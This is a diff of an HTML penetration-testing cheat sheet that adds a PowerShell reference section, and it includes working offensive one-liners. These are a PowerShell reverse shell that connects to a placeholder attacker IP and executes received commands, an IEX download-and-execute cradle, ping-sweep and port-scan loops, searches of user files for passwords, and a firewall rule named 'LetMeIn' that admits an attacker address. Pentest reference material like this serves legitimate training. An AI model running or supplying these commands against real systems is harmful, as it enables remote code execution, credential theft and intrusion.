@@ -240,28 +240,107 @@ tcpdump -i tap0 host [IP_ADDRESS] tcp port 80 and not arp and not icmp -vv
 <p><font size="3.5" color="black">https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys
 </font></p>
 <hr>
-<p><h3>Payload Generation</h3></p>
-<p><font size="3.5" color="black">Payload list:</font></p>
-<pre style="background-color:black;color:white;">msfvenom -l</pre>
+<p><h3>Scripting Languages</h3></p>
 <p><font size="3.5" color="black">Powershell</font></p>
+<br>
+<p><font size="3.5" color="black">Basic syntax - https://www.tutorialspoint.com/powershell/index.htm</font></p>
+<p><font size="3.5" color="black">Modules with PowerShell - https://resources.infosecinstitute.com/powershell-for-pentesters-part-4-modules-with-powershell/#gref</font></p>
+<p><font size="3.5" color="black">PowerShell Security: PowerShell Attack Tools, Mitigation, & Detection - https://adsecurity.org/?p=2921</font></p>
+<p><font size="3.5" color="black">Kerberoast - https://pentestlab.blog/2018/06/12/kerberoast/</font></p>
 <pre style="background-color:black;color:white;">
-#PowerShell Executables File System Locations on 64-bit Windows:
-%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	#32-bit (x86) PowerShell executable
-%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe	#64-bit (x64) Powershell executable
-%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe	#32-bit (x86) Powershell ISE executable
-%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe	#64-bit (x64) Powershell ISE executable
-%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe	#sysnative lets you run 64 bit system executables from 32 bit code.
+#PowerShell Executables File System Locations on 64-bit Windows:	(try also %SystemRoot% --> C:\windows)
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe		#32-bit (x86) PowerShell executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe		#64-bit (x64) Powershell executable
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe		#32-bit (x86) Powershell ISE executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe		#64-bit (x64) Powershell ISE executable
+%SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe		#sysnative lets you run 64 bit system executables from 32 bit code.
 
 #PowerShell Executables File System Locations on 32-bit Windows
-%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe	#32-bit (x86) PowerShell executable
-%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe	#32-bit (x86) Powershell ISE executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe		#32-bit (x86) PowerShell executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe		#32-bit (x86) Powershell ISE executable
 </pre>
 <br>
 <pre style="background-color:black;color:white;">
-$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()	(reverse shell)
+$client = New-Object System.Net.Sockets.TCPClient("[IP_ADDRESS]",port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()	(reverse powershell)
 (Optional: in cmd or "cmd /c powershell -c "[reverse_powershell]"")
+</pre>
+</br>
+<pre style="background-color:black;color:white;">
+#Syntax
+Cmdlets are small scripts that follow a dashseparated verb-noun convention such as "Get-Process".
 
-Web.config upload technique:
+#Similar Verbs with Different Actions:
+New - Creates a new resource
+Set - Modifies an existing resource
+Get - Retrieves an existing resource
+Read - Gets information from a source, such as a file
+Find - Used to look for an object
+Search - Used to create a reference to a resource
+Start - (asynchronous) begin an operation, such as starting a process
+Invoke - (synchronous) perform an operation such as running a command
+
+#Parameters:
+Each verb-noun named cmdlet may have many parameters to control cmdlet functionality.
+
+#Objects:
+The output of most cmdlets are objects that can be passed to other cmdlets and further
+acted upon. This becomes important in pipelining cmdlets.
+</pre>
+<pre style="background-color:black;color:white;">
+C:\> powershell -c "[command]"												#PowerShell cmdlets can be called from cmd.exe
+PS C:\> Get-Command / PS C:\> gcm *[string]*										#To get a list of all available cmdlets
+PS C:\> Get-Command Set*												#Get-Command supports filtering. To filter cmdlets on the verb set
+PS C:\> Get-Command –Verb Set
+PS C:\> Get-Command *Process												#Or on the noun process
+PS C:\> Get-Command –Noun process
+PS C:\> Get-Help													#To get help with help
+PS C:\> Get-Help [cmdlet]												#To read cmdlet self documentation
+PS C:\> Get-Help [cmdlet] -detailed											#Detailed help
+PS C:\> Get-Help [cmdlet] -examples / PS C:\> help [cmdlet] -examples							#Usage examples
+PS C:\> Get-Help [cmdlet] -full												#Full (everything) help
+PS C:\> Get-Help [cmdlet] -online											#Online help (if available)
+PS C:\> Get-Alias													#To list available aliases (alias alias)
+PS C:\> alias [unknown alias]												#To expand an alias into a full name
+PS C:\> alias gcm					
+PS C:\> Get-Help [cmdlet] -examples
+PS C:\> [cmdlet] | Get-Member / PS C:\> [cmdlet] | gm									#Shows properties & methods
+PS C:\> ForEach-Object { $_ } / PS C:\> [cmdlet] | % { [cmdlet] $_ }							#Takes each item on pipeline and handles it as $_
+PS C:\> Select-String / PS C:\> sls –path [file] –pattern [string]							#Searches for strings in files or output, like grep
+PS C:\> Get-Process | Format-List –property name									#Piping cmdlet output to another cmdlet
+PS C:\> ls *.txt | ForEach-Object {cat $_}										#ForEach-Object in the pipeline (alias %)
+PS C:\> Get-Process | Where-Object {$_.name –eq "notepad"}								#Where-Object condition (alias where or ?)
+PS C:\> 1..10														#Generating ranges of numbers and looping
+PS C:\> 1..10 | % {echo "Hello!"}
+PS C:\> $tmol = 42													#Creating and listing variables
+PS C:\> ls variable:
+PS C:\> Get-ChildItem													#Get a directory listing (ls, dir, gci)
+PS C:\> Copy-Item src.txt dst.txt											#Copy a file (cp, copy, cpi)
+PS C:\> Move-Item src.txt dst.txt											#Move a file (mv, move, mi)
+PS C:\> Select-String –path c:\users\*.txt –pattern password								#Find text within a file
+PS C:\> ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}					#Find text within a file
+PS C:\> Get-Content file.txt												#Display file contents (cat, type, gc)
+PS C:\> Get-Location													#Get present directory (pwd, gl)
+PS C:\> Get-Process													#Get a process listing (ps, gps)
+PS C:\> Get-Service													#Get a service listing
+PS C:\> ls | Format-List –property name											#Formatting output of a command (Format-List)
+PS C:\> ls –r | Out-Host -paging											#Paginating output
+PS C:\> Get-FileHash -Algorithm SHA1 file.txt										#Get the SHA1 hash of a file
+PS C:\> Get-Process | Export-Csv procs.csv										#Exporting output to CSV
+PS C:\> 1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}				#Conduct a ping sweep
+PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null	#Conduct a port scan
+PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://[IP_ADDRESS]:[PORT]/[FILE]","[FILE]")			#Fetch a file via HTTP (wget in PowerShell)
+PS C:\> IEX(New-Object Net.WebClient).downloadString('http://[IP_ADDRESS]:[PORT]/[FILE]')				#"Wget" something and execute it
+PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt							#Find all files with a particular name
+PS C:\> Get-HotFix													#Get a listing of all installed Microsoft Hotfixes
+PS C:\> cd HKLM:\													#Navigate the Windows registry
+PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run						#List programs set to start automatically in the registry
+PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PSFTW!"))				#Convert string from ascii to Base64
+PS C:\> Get-NetFirewallRule –all											#List and modify the Windows firewall rules
+PS C:\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress [IP_ADDRESS]				
+</pre>
+</br>
+<pre style="background-color:black;color:white;">
+#Web.config upload technique:
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
